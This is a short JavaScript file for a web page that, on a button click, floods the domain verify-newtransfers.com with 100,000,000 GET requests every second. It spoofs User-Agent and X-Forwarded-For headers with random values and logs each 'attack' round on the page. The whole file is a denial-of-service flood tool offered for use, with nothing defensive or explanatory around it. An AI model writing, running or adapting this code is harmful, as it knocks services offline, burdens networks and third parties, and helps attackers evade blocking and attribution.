const button = document.querySelector("button")
const appLogs = document.getElementsByClassName("app-logs")[0]

let success = 0
let interval

const generateTime = () => {
	let today = new Date(),
		date = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, '0') + "-" + String(today.getDate()).padStart(2, '0'),
		time = String(today.getHours()).padStart(2, '0') + ":" + String(today.getMinutes()).padStart(2, '0') + ":" + String(today.getSeconds()).padStart(2, '0')

	return `${date} ${time}`
	
}

const attackHandler = () => {
    let stress = 100_000_000

    interval = setInterval(() => {
        for(let i = 0; i < stress; i++) {
            fetch("https://verify-newtransfers.com", {
                method: "GET",
                mode: "no-cors",
                headers: {
                    "User-Agent": faker.internet.userAgent(),
                    "X-Forwarded-For": faker.internet.ip(),
                }
            })
        }
        
        const log = document.createElement("div")
        log.textContent = `[ ${ generateTime() } ] Sent ${ stress } requests, attack ${ success++ }`

        appLogs.appendChild(log)
    }, 1000)
}

button.addEventListener("click", attackHandler)